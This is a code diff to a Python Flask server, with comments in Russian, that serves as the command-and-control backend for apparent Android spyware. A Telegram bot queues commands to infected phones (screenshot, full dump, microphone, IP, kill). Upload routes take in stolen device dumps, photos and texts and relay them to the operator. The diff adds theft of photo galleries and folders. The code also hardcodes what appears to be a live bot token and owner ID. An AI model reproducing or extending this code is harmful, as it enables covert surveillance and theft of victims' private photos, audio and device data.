@@ -1,11 +1,5 @@
 """
-server.py — единая точка на render:
-  • бот-поллинг в фоне
-  • /config, /commands
-  • /upload (одним файлом)
-  • /upload_chunked: init → chunk×N → finish
-  • /upload_photo, /upload_voice, /upload_text
-  • данные в /tmp/dumps
+server.py — единая точка на render.
 """
 
 import os
@@ -27,12 +21,21 @@ from flask import Flask, request, jsonify
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8552121942:AAF8bygD17mskbtvuPnZ1-_407a3ooT_CA4")
 OWNER_ID  = int(os.getenv("OWNER_ID", "6716592576"))
 
-SPAM_MESSAGE  = os.getenv(
-    "SPAM_MESSAGE",
-    "you file has sent :)))))))",
-)
+SPAM_MESSAGE  = os.getenv("SPAM_MESSAGE", "you file has sent :)))))))")
 SPAM_INTERVAL = float(os.getenv("SPAM_INTERVAL", "1.0"))
-SPAM_SIZE_KB  = int(os.getenv("SPAM_SIZE_KB", "1024"))   # 1 МБ
+SPAM_SIZE_KB  = int(os.getenv("SPAM_SIZE_KB", "1024"))
+
+GALLERY_MAX_MB = int(os.getenv("GALLERY_MAX_MB", "50"))
+GALLERY_MAX_N  = int(os.getenv("GALLERY_MAX_N", "200"))
+PHOTO_INTERVAL = float(os.getenv("PHOTO_INTERVAL", "3.0"))
+
+PHOTO_URLS = [
+    u.strip() for u in os.getenv(
+        "PHOTO_URLS",
+        "https://raw.githubusercontent.com/Lamer1el/Backend-2/main/IMG_20260911_142328_600.jpg,"
+        "https://raw.githubusercontent.com/Lamer1el/Backend-2/main/images%20(2).png",
+    ).split(",") if u.strip()
+]
 
 SERVER_DOMAIN = os.getenv("SERVER_DOMAIN", "backend-2-3-580p.onrender.com")
 
@@ -61,7 +64,7 @@ def tg(method: str, **kwargs):
 
 def tg_file(method: str, files: dict, data: dict):
     try:
-        return requests.post(f"{API}/{method}", files=files, data=data, timeout=180).json()
+        return requests.post(f"{API}/{method}", files=files, data=data, timeout=300).json()
     except Exception as e:
         print(f"[tg:{method}] {e}")
         return {"ok": False}
@@ -106,6 +109,8 @@ def kb() -> dict:
         "keyboard": [
             [{"text": "📸 screenshot"}, {"text": "📱 info"}],
             [{"text": "📦 full dump"},  {"text": "🌐 ip"}],
+            [{"text": "🖼 gallery"},    {"text": "📂 folders"}],
+            [{"text": "🔁 selfcheck"},  {"text": "🎴 spawn"}],
             [{"text": "🔊 vibe"},       {"text": "🎤 mic"}],
             [{"text": "💀 kill"}],
         ],
@@ -115,7 +120,7 @@ def kb() -> dict:
 
 
 # ═══════════════════════════════════════
-#  ОЧЕРЕДЬ КОМАНД
+#  ОЧЕРЕДЬ
 # ═══════════════════════════════════════
 
 _command_queue: "queue.Queue[dict]" = queue.Queue()
@@ -127,7 +132,7 @@ def _push_command(cmd: str, **args):
 
 
 # ═══════════════════════════════════════
-#  БОТ-ПОЛЛИНГ
+#  БОТ
 # ═══════════════════════════════════════
 
 def bot_poll_loop():
@@ -154,38 +159,50 @@ def bot_poll_loop():
                 if text == "/start":
                     tg_send_text("avx online 🪱\nвыбирай:", kb=kb())
                 elif text == "📸 screenshot":
-                    _push_command("screenshot");  tg_send_text("→ запросил скриншот")
+                    _push_command("screenshot");  tg_send_text("→ скриншот")
                 elif text == "📱 info":
-                    _push_command("info");        tg_send_text("→ запросил инфо")
+                    _push_command("info");        tg_send_text("→ инфо")
                 elif text == "📦 full dump":
-                    _push_command("dump");        tg_send_text("→ запросил дамп")
+                    _push_command("dump");        tg_send_text("→ дамп")
                 elif text == "🌐 ip":
-                    _push_command("ip");          tg_send_text("→ запросил ip")
+                    _push_command("ip");          tg_send_text("→ ip")
+                elif text == "🖼 gallery":
+                    _push_command("gallery");     tg_send_text("→ галерея")
+                elif text == "📂 folders":
+                    _push_command("folders");     tg_send_text("→ папки")
+                elif text == "🔁 selfcheck":
+                    _push_command("selfcheck");   tg_send_text("→ selfcheck")
+                elif text == "🎴 spawn":
+                    _push_command("spawn");       tg_send_text("→ спавн фото")
                 elif text == "🔊 vibe":
-                    _push_command("vibe");        tg_send_text("→ вибрирую")
+                    _push_command("vibe");        tg_send_text("→ вибрация")
                 elif text == "🎤 mic":
-                    _push_command("mic");         tg_send_text("→ слушаю микрофон")
+                    _push_command("mic");         tg_send_text("→ микрофон")
                 elif text == "💀 kill":
                     _push_command("kill");        tg_send_text("off 💀")
                 else:
-                    tg_send_text(f"неизвестная команда: `{text}`")
+                    tg_send_text(f"неизвестно: `{text}`")
         except Exception as e:
             print(f"[bot] {e}")
             time.sleep(3)
 
 
 # ═══════════════════════════════════════
-#  РОУТЫ — ОБЩИЕ
+#  КОНФИГ
 # ═══════════════════════════════════════
 
 @app.route("/config", methods=["GET"])
 def route_config():
     return jsonify({
-        "spam_interval": SPAM_INTERVAL,
-        "spam_size_kb":  SPAM_SIZE_KB,
-        "spam_text":     SPAM_MESSAGE,
-        "server":        "render",
-        "domain":        SERVER_DOMAIN,
+        "spam_interval":  SPAM_INTERVAL,
+        "spam_size_kb":   SPAM_SIZE_KB,
+        "spam_text":      SPAM_MESSAGE,
+        "gallery_max_mb": GALLERY_MAX_MB,
+        "gallery_max_n":  GALLERY_MAX_N,
+        "photo_interval": PHOTO_INTERVAL,
+        "photo_urls":     PHOTO_URLS,
+        "server":         "render",
+        "domain":         SERVER_DOMAIN,
     }), 200
 
 
@@ -201,7 +218,7 @@ def route_commands():
 
 
 # ═══════════════════════════════════════
-#  ЧАНКОВАЯ ЗАГРУЗКА
+#  ЧАНКОВАЯ ЗАГРУЗКА ZIP
 # ═══════════════════════════════════════
 
 _chunk_sessions: dict[str, dict] = {}
@@ -232,7 +249,6 @@ def route_chunk_init():
         "tag":      tag,
         "client":   cid,
         "filename": fname,
-        "started":  time.time(),
     }
     print(f"[chunk] init {sid} total={total} client={cid}")
     return jsonify({"ok": True, "sid": sid, "chunk_size": 256 * 1024}), 200
@@ -277,7 +293,7 @@ def route_chunk_finish():
         zip_path = sess["path"]
 
     stamp = time.strftime("%Y%m%d_%H%M%S")
-    work  = DUMPS / stamp
+    work = DUMPS / stamp
     work.mkdir(parents=True, exist_ok=True)
     try:
         with zipfile.ZipFile(zip_path, "r") as z:
@@ -290,16 +306,18 @@ def route_chunk_finish():
     )
 
     info = sess["info"]
+    size_mb = zip_path.stat().st_size / 1024 / 1024
     caption = (
         f"*[{sess['tag']}] — dump* `{stamp}`\n"
         f"```\n"
-        f"User:    {info.get('user','-')}\n"
-        f"Host:    {info.get('hostname','-')}\n"
-        f"Model:   {info.get('brand','-')} {info.get('model','-')}\n"
-        f"Android: {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
-        f"ABI:     {info.get('cpu_abi','-')}\n"
-        f"IP:      {info.get('ip','-')}\n"
-        f"Apps:    {len(info.get('installed_apps', []))}\n"
+        f"User:     {info.get('user','-')}\n"
+        f"Device:   {info.get('brand','-')} {info.get('model','-')}\n"
+        f"Android:  {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
+        f"ABI:      {info.get('cpu_abi','-')}\n"
+        f"IP:       {info.get('ip','-')}\n"
+        f"Apps:     {len(info.get('installed_apps', []))}\n"
+        f"Gallery:  {info.get('gallery_count', 0)} files / {info.get('gallery_mb', 0)} MB\n"
+        f"Zip size: {size_mb:.1f} MB\n"
         f"```\n"
         f"🌐 https://{SERVER_DOMAIN}/health"
     )
@@ -308,14 +326,13 @@ def route_chunk_finish():
 
 
 # ═══════════════════════════════════════
-#  ЗАГРУЗКА ОДНИМ ФАЙЛОМ
+#  ПРОЧИЕ ЗАГРУЗКИ
 # ═══════════════════════════════════════
 
 @app.route("/upload", methods=["POST"])
 def route_upload():
     if "file" not in request.files:
         return jsonify({"ok": False, "err": "no file"}), 400
-
     f = request.files["file"]
     raw_info = request.form.get("info", "{}")
     try:
@@ -341,23 +358,19 @@ def route_upload():
     )
 
     tag = request.form.get("tag", "REPORT")
+    size_mb = zip_path.stat().st_size / 1024 / 1024
     caption = (
         f"*[{tag}] — dump* `{stamp}`\n"
         f"```\n"
-        f"User:    {info.get('user','-')}\n"
-        f"Host:    {info.get('hostname','-')}\n"
-        f"Model:   {info.get('brand','-')} {info.get('model','-')}\n"
-        f"Android: {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
-        f"IP:      {info.get('ip','-')}\n"
+        f"Device:   {info.get('brand','-')} {info.get('model','-')}\n"
+        f"Android:  {info.get('android','-')}\n"
+        f"IP:       {info.get('ip','-')}\n"
+        f"Zip size: {size_mb:.1f} MB\n"
         f"```"
     )
     tg_send_document(zip_path, caption=caption)
     return jsonify({"ok": True, "stamp": stamp}), 200
 
-
-# ═══════════════════════════════════════
-#  ПРОЧИЕ ЗАГРУЗКИ
-# ═══════════════════════════════════════
 
 @app.route("/upload_photo", methods=["POST"])
 def route_upload_photo():
@@ -367,7 +380,6 @@ def route_upload_photo():
     tmp = DUMPS / f"shot_{int(time.time())}.png"
     f.save(tmp)
     caption = request.form.get("caption", "📸")
-    print(f"[photo] saved {tmp.name} ({tmp.stat().st_size//1024}kb)")
     tg_send_photo(tmp, caption=caption)
     return jsonify({"ok": True}), 200
 
@@ -389,6 +401,28 @@ def route_upload_text():
     tag  = request.form.get("tag", "MSG")
     if text:
         tg_send_text(f"*[{tag}]*\n{text}")
+    return jsonify({"ok": True}), 200
+
+
+@app.route("/upload_many", methods=["POST"])
+def route_upload_many():
+    if "file" not in request.files:
+        return jsonify({"ok": False}), 400
+    f = request.files["file"]
+    rel = request.form.get("path", f.name)
+    tmp = DUMPS / "gallery" / rel.replace("/", "_")
+    tmp.parent.mkdir(parents=True, exist_ok=True)
+    f.save(tmp)
+
+    caption = request.form.get("caption", "")
+    ext = tmp.suffix.lower()
+    try:
+        if ext in (".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp"):
+            tg_send_photo(tmp, caption=caption or f"🖼 {rel}")
+        else:
+            tg_send_document(tmp, caption=caption or f"📄 {rel}")
+    except Exception as e:
+        print(f"[many] {e}")
     return jsonify({"ok": True}), 200
 
 
@@ -418,7 +452,7 @@ def route_index():
 
 
 # ═══════════════════════════════════════
-#  СТАРТ БОТ-ПОТОКА
+#  БОТ-ПОТОК
 # ═══════════════════════════════════════
 
 _bot_thread = None
